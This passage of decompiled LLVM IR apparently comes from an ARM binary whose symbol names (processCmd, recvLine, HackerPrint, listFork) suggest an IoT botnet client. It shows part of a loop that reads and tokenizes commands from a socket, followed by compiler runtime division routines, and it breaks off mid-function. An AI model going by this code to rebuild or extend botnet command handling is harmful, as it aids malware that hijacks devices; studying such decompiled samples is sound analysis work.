  store i32 %v1_1387c, i32* @r0, align 4
  %v3_139d4 = call i32 @__GI_strtok(i32 %v1_1387c, i32* nonnull @global_var_21968.1308)
  store i8* %v5_137ac, i8** %stack_var_-132, align 4
  %v2_13ad040 = icmp eq i32 %v3_139d4, 0
  br i1 %v2_13ad040, label %dec_label_pc_13ad8, label %dec_label_pc_139ec

dec_label_pc_139ec:                               ; preds = %dec_label_pc_139c0, %dec_label_pc_13ab8
  %stack_var_-36.043.in = phi i32 [ %v3_13ac0, %dec_label_pc_13ab8 ], [ %v3_139d4, %dec_label_pc_139c0 ]
  %stack_var_-40.141 = phi i32 [ %stack_var_-40.0, %dec_label_pc_13ab8 ], [ 1, %dec_label_pc_139c0 ]
  %stack_var_-36.043 = inttoptr i32 %stack_var_-36.043.in to i8*
  %v2_139f0 = load i8, i8* %stack_var_-36.043, align 1
  %v7_139f4 = icmp eq i8 %v2_139f0, 10
  br i1 %v7_139f4, label %dec_label_pc_13ab8, label %dec_label_pc_139fc

dec_label_pc_139fc:                               ; preds = %dec_label_pc_139ec
  store i32 %stack_var_-40.141, i32* @r4, align 4
  %v3_13a08 = call i32 @strlen(i8* nonnull %stack_var_-36.043)
  %v1_13a10 = add i32 %v3_13a08, 1
  %v1_13a18 = call i32 @malloc(i32 %v1_13a10)
  %v0_13a28 = load i32, i32* @r4, align 4
  %v3_13a28 = mul i32 %v0_13a28, 4
  %v2_13a34 = add i32 %v2_13b18, %v3_13a28
  %v2_13a38 = inttoptr i32 %v2_13a34 to i32*
  store i32 %v1_13a18, i32* %v2_13a38, align 4
  %v3_13a44 = mul i32 %stack_var_-40.141, 4
  %v2_13a50 = add i32 %v2_13b18, %v3_13a44
  %v1_13a54 = inttoptr i32 %v2_13a50 to i32*
  %v2_13a54 = load i32, i32* %v1_13a54, align 4
  store i32 %v2_13a54, i32* @r4, align 4
  %v3_13a60 = call i32 @strlen(i8* nonnull %stack_var_-36.043)
  %v1_13a68 = add i32 %v3_13a60, 1
  %v0_13a6c = load i32, i32* @r4, align 4
  store i32 %v1_13a68, i32* @r2, align 4
  %v2_13a7c = inttoptr i32 %v0_13a6c to i8*
  %v3_13a7c = call i32 @__GI_memset(i8* %v2_13a7c, i32 0)
  %v2_13a98 = load i32, i32* %v1_13a54, align 4
  %v4_13aa8 = call i32 @strcpy(i32 %v2_13a98, i8* nonnull %stack_var_-36.043)
  %v1_13ab0 = add i32 %stack_var_-40.141, 1
  br label %dec_label_pc_13ab8

dec_label_pc_13ab8:                               ; preds = %dec_label_pc_139ec, %dec_label_pc_139fc
  %stack_var_-40.0 = phi i32 [ %stack_var_-40.141, %dec_label_pc_139ec ], [ %v1_13ab0, %dec_label_pc_139fc ]
  store i32 0, i32* @r0, align 4
  %v3_13ac0 = call i32 @__GI_strtok(i32 0, i32* nonnull @global_var_21968.1308)
  %v2_13ad0 = icmp eq i32 %v3_13ac0, 0
  br i1 %v2_13ad0, label %dec_label_pc_13ad8, label %dec_label_pc_139ec

dec_label_pc_13ad8:                               ; preds = %dec_label_pc_13ab8, %dec_label_pc_139c0
  %stack_var_-40.1.lcssa = phi i32 [ 1, %dec_label_pc_139c0 ], [ %stack_var_-40.0, %dec_label_pc_13ab8 ]
  %v3_13ae4 = call i32 @processCmd(i32 %stack_var_-40.1.lcssa, i32* %v2_13ae4)
  %v7_13af0 = icmp slt i32 %stack_var_-40.1.lcssa, 2
  br i1 %v7_13af0, label %dec_label_pc_13b48, label %dec_label_pc_13b08.lr.ph

dec_label_pc_13b08.lr.ph:                         ; preds = %dec_label_pc_13ad8
  br label %dec_label_pc_13b08

dec_label_pc_13b08:                               ; preds = %dec_label_pc_13b08.lr.ph, %dec_label_pc_13b08
  %storemerge18105 = phi i32 [ 1, %dec_label_pc_13b08.lr.ph ], [ %v1_13b30, %dec_label_pc_13b08 ]
  %v3_13b10 = mul i32 %storemerge18105, 4
  %v2_13b1c = add i32 %v2_13b18, %v3_13b10
  %v1_13b20 = inttoptr i32 %v2_13b1c to i32*
  %v2_13b20 = load i32, i32* %v1_13b20, align 4
  %v1_13b28 = call i32 @free(i32 %v2_13b20)
  %v1_13b30 = add nuw nsw i32 %storemerge18105, 1
  %v5_13b44 = icmp slt i32 %v1_13b30, %stack_var_-40.1.lcssa
  br i1 %v5_13b44, label %dec_label_pc_13b08, label %dec_label_pc_13b48

dec_label_pc_13b48:                               ; preds = %dec_label_pc_13b08, %dec_label_pc_138dc, %dec_label_pc_13708, %dec_label_pc_13ad8, %dec_label_pc_13764, %dec_label_pc_136b8, %dec_label_pc_13328
  %v2_13b4c = load i32, i32* @global_var_2b5d0.55, align 4
  %v5_13b68 = call i32 @recvLine(i32 %v2_13b4c, i8* %v4_13b68, i32 4096, i32 %v2_13b58)
  %v3_13b78 = icmp eq i32 %v5_13b68, -1
  br i1 %v3_13b78, label %dec_label_pc_1330c, label %dec_label_pc_135e0

; uselistorder directives
  uselistorder i32 %v5_13b68, { 1, 0 }
  uselistorder i32 %stack_var_-40.1.lcssa, { 2, 1, 0 }
  uselistorder i32 %v3_13ac0, { 1, 0 }
  uselistorder i8* %stack_var_-36.043, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-40.141, { 1, 3, 0, 2 }
  uselistorder i8* %v5_138b8, { 1, 0 }
  uselistorder i32 %v1_138b4, { 1, 0 }
  uselistorder i8* %storemerge936, { 1, 0 }
  uselistorder i32 %v1_1387c, { 1, 2, 0 }
  uselistorder i32 %v2_137f4, { 1, 2, 0 }
  uselistorder i8* %v5_137ac, { 5, 6, 0, 3, 2, 1, 4, 7, 9, 8 }
  uselistorder i32 %v1_137a8, { 0, 2, 1, 3, 4 }
  uselistorder i8* %storemerge10, { 0, 1, 3, 4, 2 }
  uselistorder i1 %v9_1361c, { 1, 0 }
  uselistorder i32 %v3_135e8, { 1, 0 }
  uselistorder i32 %storemerge16, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v3_13508, { 1, 0 }
  uselistorder i32 %v1_134ec, { 1, 0 }
  uselistorder i32 %v1_133c0, { 1, 2, 0, 3 }
  uselistorder i32 %v2_13b18, { 2, 0, 1 }
  uselistorder i32 %v2_138f4, { 2, 3, 4, 1, 0 }
  uselistorder i8* %v4_13b68, { 3, 0, 1, 2 }
  uselistorder i32 %v2_13b58, { 6, 2, 3, 4, 5, 0, 1 }
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8** %stack_var_-132, { 1, 0 }
  uselistorder i32 (i32, i32*)* @__GI_strtok, { 0, 1, 2, 3, 12, 13, 14, 15, 16, 17, 18, 19, 4, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32 (i32, i32, i32, i32)* @fdgets, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @szprintf, { 209, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0, 208, 207, 206, 205, 204, 203, 202, 201, 200, 199, 198, 197, 196, 195, 194, 193, 192, 191, 190, 189, 188, 187, 186, 185, 184, 183, 182, 181, 180, 179, 178, 177, 176, 175, 174, 173, 172, 171, 170, 169, 168, 167, 166, 165, 164, 163, 162, 161, 160, 159, 158, 157, 156, 155, 154, 153, 152, 151, 150, 149, 148, 147, 146, 145, 144, 143, 142, 141, 140, 139, 138, 137, 136, 135, 134, 133, 132, 131, 130, 129, 128, 127, 126, 125, 124, 123, 122, 121, 120, 119, 118, 117, 116, 115, 114, 113, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22 }
  uselistorder i32 ()* @listFork, { 18, 17, 16, 7, 6, 5, 4, 3, 2, 1, 0, 15, 14, 13, 12, 11, 10, 9, 8 }
  uselistorder i32 (i32)* @__GI_toupper, { 3, 2, 1, 0 }
  uselistorder i32* @global_var_2b5d4.61, { 2, 3, 0, 4, 5, 6, 7, 1, 8 }
  uselistorder i32* @global_var_31854.64, { 0, 2, 3, 4, 5, 6, 7, 1, 10, 8, 9 }
  uselistorder i32 (i32, i32)* @HackerPrint, { 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 17, 16, 0 }
  uselistorder i32* @global_var_2b5d0.55, { 2, 3, 4, 0, 1, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i32 (i32)* @sleep, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_waitpid, { 2, 1, 0 }
  uselistorder i32 ()* @__libc_fork, { 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @init_rand, { 1, 0 }
  uselistorder i32 (i32)* @srand, { 2, 1, 0 }
  uselistorder i32 (i32*)* @__GI_time, { 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 0, 1, 2, 3, 4, 5, 6, 26, 27 }
  uselistorder i32 (i32)* @__GI_inet_ntoa, { 4, 3, 2, 1, 0 }
  uselistorder i32* @global_var_31848.479, { 0, 1, 4, 2, 3 }
  uselistorder i32 ()* @getBuild, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13b48, { 0, 3, 1, 4, 2, 5, 6 }
  uselistorder label %dec_label_pc_13b08, { 1, 0 }
  uselistorder label %dec_label_pc_13ab8, { 1, 0 }
  uselistorder label %dec_label_pc_139ec, { 1, 0 }
  uselistorder label %dec_label_pc_139c0, { 1, 0 }
  uselistorder label %dec_label_pc_13988, { 1, 0 }
  uselistorder label %dec_label_pc_13890, { 1, 0 }
  uselistorder label %dec_label_pc_1386c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1385c, { 1, 0 }
  uselistorder label %dec_label_pc_137dc, { 1, 0 }
  uselistorder label %dec_label_pc_13744, { 1, 0 }
  uselistorder label %dec_label_pc_13708, { 1, 0 }
  uselistorder label %dec_label_pc_13654, { 1, 0 }
  uselistorder label %dec_label_pc_135d4, { 1, 0 }
  uselistorder label %dec_label_pc_13544, { 1, 0 }
  uselistorder label %dec_label_pc_13504, { 1, 0 }
  uselistorder label %dec_label_pc_13414, { 1, 0 }
  uselistorder label %dec_label_pc_133cc, { 1, 0 }
  uselistorder label %dec_label_pc_1330c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_132f0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1318c, { 1, 0 }
}

define i32 @__udivsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_13bd0 = add i32 %arg2, -1
  %v7_13bd0 = icmp eq i32 %arg2, 1
  br i1 %v7_13bd0, label %bb, label %bb80

bb:                                               ; preds = %entry
  %v2_13bd4 = load i32, i32* @r0, align 4
  ret i32 %v2_13bd4

bb80:                                             ; preds = %entry
  %v2_13bd0 = icmp eq i32 %arg2, 0
  br i1 %v2_13bd0, label %dec_label_pc_13cb8, label %dec_label_pc_13bdc

dec_label_pc_13bdc:                               ; preds = %bb80
  %v0_13bdc = load i32, i32* @r0, align 4
  %tmp = icmp ugt i32 %v0_13bdc, %arg2
  br i1 %tmp, label %dec_label_pc_13be4, label %dec_label_pc_13c70

dec_label_pc_13be4:                               ; preds = %dec_label_pc_13bdc
  %v2_13be4 = and i32 %v1_13bd0, %arg2
  %v4_13be4 = icmp eq i32 %v2_13be4, 0
  br i1 %v4_13be4, label %dec_label_pc_13c7c, label %dec_label_pc_13bec

dec_label_pc_13bec:                               ; preds = %dec_label_pc_13be4
  %v3_13bec = icmp ult i32 %arg2, 536870912
  br i1 %v3_13bec, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_13bec
  %v4_13bf0 = mul i32 %arg2, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_13bec, %.thread
  %v0_13c10.pr36.ph = phi i32 [ %v4_13bf0, %.thread ], [ %arg2, %dec_label_pc_13bec ]
  %storemerge135 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_13bec ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb83
  %v0_13c10.pr36 = phi i32 [ %v4_13c04, %bb83 ], [ %v0_13c10.pr36.ph, %.preheader.preheader ]
  %v1_13c08 = phi i32 [ %v4_13c08, %bb83 ], [ %storemerge135, %.preheader.preheader ]
  %v2_13bfc = icmp ugt i32 %v0_13c10.pr36, 268435455
  br i1 %v2_13bfc, label %.thread2, label %bb81

.thread2:                                         ; preds = %.preheader
  br label %dec_label_pc_13c10thread-pre-split.loopexit

bb81:                                             ; preds = %.preheader
  %v4_13c00 = icmp ult i32 %v0_13c10.pr36, %v0_13bdc
  br i1 %v4_13c00, label %bb82, label %dec_label_pc_13c10thread-pre-split.loopexit.loopexit

bb82:                                             ; preds = %bb81
  %v2_13c04 = and i32 %v0_13c10.pr36, 268435456
  %v3_13c04 = icmp eq i32 %v2_13c04, 0
  %v4_13c04 = mul i32 %v0_13c10.pr36, 16
  br i1 %v3_13c04, label %bb83, label %dec_label_pc_13c10.loopexit

bb83:                                             ; preds = %bb82
  %v2_13c08 = and i32 %v1_13c08, 268435456
  %v3_13c08 = icmp eq i32 %v2_13c08, 0
  %v4_13c08 = mul i32 %v1_13c08, 16
  br i1 %v3_13c08, label %.preheader, label %dec_label_pc_13c10thread-pre-split.loopexit.loopexit

dec_label_pc_13c10thread-pre-split.loopexit.loopexit: ; preds = %bb83, %bb81
  %v1_13c1c48.ph = phi i32 [ %v1_13c08, %bb81 ], [ %v4_13c08, %bb83 ]
  %v0_13c10.pr38.ph = phi i32 [ %v0_13c10.pr36, %bb81 ], [ %v4_13c04, %bb83 ]
  br label %dec_label_pc_13c10thread-pre-split.loopexit

dec_label_pc_13c10thread-pre-split.loopexit:      ; preds = %dec_label_pc_13c10thread-pre-split.loopexit.loopexit, %.thread2
  %v1_13c1c48 = phi i32 [ %v1_13c08, %.thread2 ], [ %v1_13c1c48.ph, %dec_label_pc_13c10thread-pre-split.loopexit.loopexit ]
  %v0_13c10.pr38 = phi i32 [ %v0_13c10.pr36, %.thread2 ], [ %v0_13c10.pr38.ph, %dec_label_pc_13c10thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_13c10thread-pre-split

dec_label_pc_13c10thread-pre-split:               ; preds = %dec_label_pc_13c10thread-pre-split.loopexit, %bb85
  %v1_13c1c46 = phi i32 [ %v1_13c1c48, %dec_label_pc_13c10thread-pre-split.loopexit ], [ %v3_13c1c, %bb85 ]
  %v0_13c10.pr = phi i32 [ %v0_13c10.pr38, %dec_label_pc_13c10thread-pre-split.loopexit ], [ %v3_13c18, %bb85 ]
  br label %dec_label_pc_13c10

dec_label_pc_13c10.loopexit:                      ; preds = %bb82
  br label %dec_label_pc_13c10

dec_label_pc_13c10:                               ; preds = %dec_label_pc_13c10.loopexit, %dec_label_pc_13c10thread-pre-split
  %v1_13c1c = phi i32 [ %v1_13c1c46, %dec_label_pc_13c10thread-pre-split ], [ %v1_13c08, %dec_label_pc_13c10.loopexit ]
  %v1_13c18 = phi i32 [ %v0_13c10.pr, %dec_label_pc_13c10thread-pre-split ], [ %v4_13c04, %dec_label_pc_13c10.loopexit ]
  %v2_13c10 = icmp slt i32 %v1_13c18, 0
  br i1 %v2_13c10, label %dec_label_pc_13c24, label %bb84

bb84:                                             ; preds = %dec_label_pc_13c10
  %v4_13c14 = icmp ult i32 %v1_13c18, %v0_13bdc
  br i1 %v4_13c14, label %bb85, label %dec_label_pc_13c24

bb85:                                             ; preds = %bb84
  %v3_13c18 = mul i32 %v1_13c18, 2
  %v2_13c1c = icmp slt i32 %v1_13c1c, 0
  %v3_13c1c = mul i32 %v1_13c1c, 2
  br i1 %v2_13c1c, label %dec_label_pc_13c24, label %dec_label_pc_13c10thread-pre-split

dec_label_pc_13c24:                               ; preds = %bb84, %dec_label_pc_13c10, %bb85
  %v2_13c3059 = phi i32 [ %v3_13c1c, %bb85 ], [ %v1_13c1c, %bb84 ], [ %v1_13c1c, %dec_label_pc_13c10 ]
  %v1_13c2851 = phi i32 [ %v3_13c18, %bb85 ], [ %v1_13c18, %bb84 ], [ %v1_13c18, %dec_label_pc_13c10 ]
  br label %dec_label_pc_13c28

dec_label_pc_13c28:                               ; preds = %.thread11, %dec_label_pc_13c24
  %v1_13c5c = phi i32 [ %v4_13c5c, %.thread11 ], [ %v2_13c3059, %dec_label_pc_13c24 ]
  %v1_13c30 = phi i32 [ %v0_13c68, %.thread11 ], [ 0, %dec_label_pc_13c24 ]
  %v1_13c60 = phi i32 [ %v4_13c60, %.thread11 ], [ %v1_13c2851, %dec_label_pc_13c24 ]
  %v1_13c2c = phi i32 [ %v0_13c58, %.thread11 ], [ %v0_13bdc, %dec_label_pc_13c24 ]
  %v3_13c28 = icmp ult i32 %v1_13c2c, %v1_13c60
  br i1 %v3_13c28, label %.thread7, label %bb86

bb86:                                             ; preds = %dec_label_pc_13c28
  %v3_13c2c = sub i32 %v1_13c2c, %v1_13c60
  %v3_13c30 = or i32 %v1_13c30, %v1_13c5c
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_13c28, %bb86
  %v1_13c38 = phi i32 [ %v1_13c2c, %dec_label_pc_13c28 ], [ %v3_13c2c, %bb86 ]
  %v1_13c3c = phi i32 [ %v1_13c30, %dec_label_pc_13c28 ], [ %v3_13c30, %bb86 ]
  %v4_13c34 = udiv i32 %v1_13c60, 2
  %v6_13c34 = icmp ult i32 %v1_13c38, %v4_13c34
  br i1 %v6_13c34, label %.thread8, label %bb87

bb87:                                             ; preds = %.thread7
  %v3_13c38 = urem i32 %v1_13c60, 2
  %v4_13c38 = icmp eq i32 %v3_13c38, 0
  %v6_13c38 = sub i32 %v1_13c38, %v4_13c34
  br i1 %v4_13c38, label %.thread8, label %bb88

bb88:                                             ; preds = %bb87
  %v5_13c3c = udiv i32 %v1_13c5c, 2
  %v6_13c3c = or i32 %v1_13c3c, %v5_13c3c
  br label %.thread8

.thread8:                                         ; preds = %bb87, %.thread7, %bb88
  %v1_13c44 = phi i32 [ %v6_13c38, %bb87 ], [ %v1_13c38, %.thread7 ], [ %v6_13c38, %bb88 ]
  %v1_13c48 = phi i32 [ %v1_13c3c, %bb87 ], [ %v1_13c3c, %.thread7 ], [ %v6_13c3c, %bb88 ]
  %v4_13c40 = udiv i32 %v1_13c60, 4
  %v6_13c40 = icmp ult i32 %v1_13c44, %v4_13c40
  br i1 %v6_13c40, label %.thread9, label %bb89

bb89:                                             ; preds = %.thread8
  %v3_13c44 = and i32 %v1_13c60, 2
  %v4_13c44 = icmp eq i32 %v3_13c44, 0
  %v6_13c44 = sub i32 %v1_13c44, %v4_13c40
  br i1 %v4_13c44, label %.thread9, label %bb90

bb90:                                             ; preds = %bb89
  %v5_13c48 = udiv i32 %v1_13c5c, 4
  %v6_13c48 = or i32 %v1_13c48, %v5_13c48
  br label %.thread9

.thread9:                                         ; preds = %bb89, %.thread8, %bb90
  %v1_13c50 = phi i32 [ %v6_13c44, %bb89 ], [ %v1_13c44, %.thread8 ], [ %v6_13c44, %bb90 ]
  %v1_13c54 = phi i32 [ %v1_13c48, %bb89 ], [ %v1_13c48, %.thread8 ], [ %v6_13c48, %bb90 ]
  %v4_13c4c = udiv i32 %v1_13c60, 8
  %v6_13c4c = icmp ult i32 %v1_13c50, %v4_13c4c
  br i1 %v6_13c4c, label %thread-pre-split, label %bb91

bb91:                                             ; preds = %.thread9
  %v3_13c50 = and i32 %v1_13c60, 4
  %v4_13c50 = icmp eq i32 %v3_13c50, 0
  %v6_13c50 = sub i32 %v1_13c50, %v4_13c4c
  br i1 %v4_13c50, label %thread-pre-split, label %bb92

bb92:                                             ; preds = %bb91
  %v5_13c54 = udiv i32 %v1_13c5c, 8
  %v6_13c54 = or i32 %v1_13c54, %v5_13c54
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb92, %.thread9, %bb91
  %v0_13c68 = phi i32 [ %v1_13c54, %bb91 ], [ %v1_13c54, %.thread9 ], [ %v6_13c54, %bb92 ]
  %v0_13c58 = phi i32 [ %v6_13c50, %bb91 ], [ %v1_13c50, %.thread9 ], [ %v6_13c50, %bb92 ]
  %v2_13c58 = icmp eq i32 %v0_13c58, 0
  br i1 %v2_13c58, label %dec_label_pc_13c68, label %bb93

bb93:                                             ; preds = %thread-pre-split
  %tmp140 = icmp ult i32 %v1_13c5c, 16
  br i1 %tmp140, label %dec_label_pc_13c68, label %.thread11

.thread11:                                        ; preds = %bb93
  %v4_13c5c = udiv i32 %v1_13c5c, 16
  %v4_13c60 = udiv i32 %v1_13c60, 16
  br label %dec_label_pc_13c28

dec_label_pc_13c68:                               ; preds = %thread-pre-split, %bb93
  ret i32 %v0_13c68

dec_label_pc_13c70:                               ; preds = %dec_label_pc_13bdc
  %v9_13bdc = icmp eq i32 %v0_13bdc, %arg2
  %. = zext i1 %v9_13bdc to i32
  ret i32 %.

dec_label_pc_13c7c:                               ; preds = %dec_label_pc_13be4
  %v2_13c7c = icmp ugt i32 %arg2, 65535
  br i1 %v2_13c7c, label %bb97, label %.thread16

bb97:                                             ; preds = %dec_label_pc_13c7c
  %v2_13c80 = and i32 %arg2, 32768
  %v3_13c80 = icmp eq i32 %v2_13c80, 0
  %v4_13c80 = udiv i32 %arg2, 65536
  br i1 %v3_13c80, label %.thread16, label %bb98

.thread16:                                        ; preds = %bb97, %dec_label_pc_13c7c
  %v0_13c8c65 = phi i32 [ %arg2, %dec_label_pc_13c7c ], [ %v4_13c80, %bb97 ]
  br label %bb98

bb98:                                             ; preds = %bb97, %.thread16
  %v1_13c90 = phi i32 [ %v0_13c8c65, %.thread16 ], [ %v4_13c80, %bb97 ]
  %storemerge = phi i32 [ 0, %.thread16 ], [ 16, %bb97 ]
  %v2_13c8c = icmp ugt i32 %v1_13c90, 255
  br i1 %v2_13c8c, label %bb99, label %.thread17

bb99:                                             ; preds = %bb98
  %v2_13c90 = and i32 %v1_13c90, 128
  %v3_13c90 = icmp eq i32 %v2_13c90, 0
  %v4_13c90 = udiv i32 %v1_13c90, 256
  br i1 %v3_13c90, label %.thread17, label %bb100

bb100:                                            ; preds = %bb99
  %v2_13c94 = or i32 %storemerge, 8
  br label %.thread17

.thread17:                                        ; preds = %bb99, %bb98, %bb100
  %v1_13ca0 = phi i32 [ %storemerge, %bb98 ], [ %storemerge, %bb99 ], [ %v2_13c94, %bb100 ]
  %v1_13c9c = phi i32 [ %v1_13c90, %bb98 ], [ %v4_13c90, %bb99 ], [ %v4_13c90, %bb100 ]
  %v2_13c98 = icmp ugt i32 %v1_13c9c, 15
  br i1 %v2_13c98, label %bb101, label %.thread18

bb101:                                            ; preds = %.thread17
  %v2_13c9c = and i32 %v1_13c9c, 8
  %v3_13c9c = icmp eq i32 %v2_13c9c, 0
  %v4_13c9c = udiv i32 %v1_13c9c, 16
  br i1 %v3_13c9c, label %.thread18, label %bb102

bb102:                                            ; preds = %bb101
  %v2_13ca0 = add nsw i32 %v1_13ca0, 4
  br label %.thread18

.thread18:                                        ; preds = %bb101, %.thread17, %bb102
  %v4_13ca8 = phi i32 [ %v1_13ca0, %.thread17 ], [ %v1_13ca0, %bb101 ], [ %v2_13ca0, %bb102 ]
  %v5_13cac = phi i32 [ %v1_13c9c, %.thread17 ], [ %v4_13c9c, %bb101 ], [ %v4_13c9c, %bb102 ]
  %v2_13ca4 = icmp ugt i32 %v5_13cac, 3
  %v7_13ca4 = icmp eq i32 %v5_13cac, 4
  %v2_13ca8 = xor i1 %v7_13ca4, true
  %v3_13ca8 = and i1 %v2_13ca4, %v2_13ca8
  br i1 %v3_13ca8, label %bb103, label %bb104

bb103:                                            ; preds = %.thread18
  %v5_13ca8 = add nsw i32 %v4_13ca8, 3
  br label %bb104

bb104:                                            ; preds = %.thread18, %bb103
  %v4_13cac = phi i32 [ %v4_13ca8, %.thread18 ], [ %v5_13ca8, %bb103 ]
  %v2_13cac = xor i1 %v2_13ca4, true
  %v3_13cac = or i1 %v7_13ca4, %v2_13cac
  br i1 %v3_13cac, label %bb105, label %bb106

bb105:                                            ; preds = %bb104
  %v8_13cac = udiv i32 %v5_13cac, 2
  %v9_13cac = add i32 %v4_13cac, %v8_13cac
  br label %bb106

bb106:                                            ; preds = %bb104, %bb105
  %v1_13cb0 = phi i32 [ %v4_13cac, %bb104 ], [ %v9_13cac, %bb105 ]
  %v6_13cb0 = lshr i32 %v0_13bdc, %v1_13cb0
  ret i32 %v6_13cb0

dec_label_pc_13cb8:                               ; preds = %bb80
  %v0_13cb8 = load i32, i32* @lr, align 4
  %v0_13cbc = call i32 @__aeabi_ldiv0()
  call void @__pseudo_branch(i32 %v0_13cb8)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_13cac, { 1, 0 }
  uselistorder i1 %v7_13ca4, { 1, 0 }
  uselistorder i32 %v4_13c9c, { 1, 0 }
  uselistorder i32 %v1_13c9c, { 1, 0, 2, 3 }
  uselistorder i32 %v4_13c90, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v1_13c90, { 1, 0, 2, 3 }
  uselistorder i32 %v4_13c80, { 1, 0 }
  uselistorder i32 %v0_13c58, { 1, 0 }
  uselistorder i32 %v4_13c4c, { 1, 0 }
  uselistorder i32 %v1_13c54, { 1, 2, 0 }
  uselistorder i32 %v4_13c40, { 1, 0 }
  uselistorder i32 %v1_13c48, { 1, 2, 0 }
  uselistorder i32 %v4_13c34, { 1, 0 }
  uselistorder i32 %v1_13c3c, { 1, 2, 0 }
  uselistorder i32 %v1_13c60, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_13c30, { 1, 0 }
  uselistorder i32 %v1_13c5c, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_13c1c, { 1, 0 }
  uselistorder i32 %v3_13c18, { 1, 0 }
  uselistorder i32 %v1_13c18, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_13c1c, { 1, 2, 0, 3 }
  uselistorder i32 %v4_13c08, { 1, 0 }
  uselistorder i32 %v4_13c04, { 2, 1, 0 }
  uselistorder i32 %v1_13c08, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_13c10.pr36, { 1, 2, 0, 5, 4, 3 }
  uselistorder i32 %v0_13bdc, { 2, 5, 3, 1, 4, 0 }
  uselistorder i32 %arg2, { 8, 12, 7, 6, 5, 10, 11, 0, 9, 1, 4, 2, 3 }
  uselistorder label %bb106, { 1, 0 }
  uselistorder label %bb104, { 1, 0 }
  uselistorder label %.thread18, { 2, 0, 1 }
  uselistorder label %.thread17, { 2, 0, 1 }
  uselistorder label %bb98, { 1, 0 }
  uselistorder label %dec_label_pc_13c68, { 1, 0 }
  uselistorder label %thread-pre-split, { 0, 2, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_13c24, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13c10thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
}

define i32 @__aeabi_uidivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_13ccc = udiv i32 %arg1, %arg2
  ret i32 %v2_13ccc
}

define i32 @__umodsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_13ce0 = add i32 %arg2, -1
  %v2_13ce0 = icmp eq i32 %arg2, 0
  br i1 %v2_13ce0, label %dec_label_pc_13d9c, label %dec_label_pc_13ce8

dec_label_pc_13ce8:                               ; preds = %entry
  %v7_13ce0 = icmp eq i32 %arg2, 1
  br i1 %v7_13ce0, label %.thread65, label %bb

bb:                                               ; preds = %dec_label_pc_13ce8
  %v1_13ce8 = load i32, i32* @r0, align 4
  %v10_13ce8 = icmp eq i32 %v1_13ce8, %arg2
  br i1 %v10_13ce8, label %.thread65, label %bb74

.thread65:                                        ; preds = %dec_label_pc_13ce8, %bb
  br label %.thread67

bb74:                                             ; preds = %bb
  %v4_13ce8 = icmp ult i32 %v1_13ce8, %arg2
  br i1 %v4_13ce8, label %bb76, label %bb75

bb75:                                             ; preds = %bb74
  %v6_13cf0 = and i32 %v1_13ce0, %arg2
  %v8_13cf0 = icmp eq i32 %v6_13cf0, 0
  br i1 %v8_13cf0, label %.thread67, label %dec_label_pc_13d00.preheader

.thread67:                                        ; preds = %bb75, %.thread65
  %v1_13cf4 = phi i32 [ %v1_13ce8, %bb75 ], [ 0, %.thread65 ]
  %v3_13cf4 = and i32 %v1_13cf4, %v1_13ce0
  br label %bb76

dec_label_pc_13d00.preheader:                     ; preds = %bb75
  %v2_13d0099 = icmp ugt i32 %arg2, 268435455
  br i1 %v2_13d0099, label %.thread, label %bb77

bb76:                                             ; preds = %dec_label_pc_13d90, %bb74, %bb89, %bb84, %dec_label_pc_13d60, %.thread67
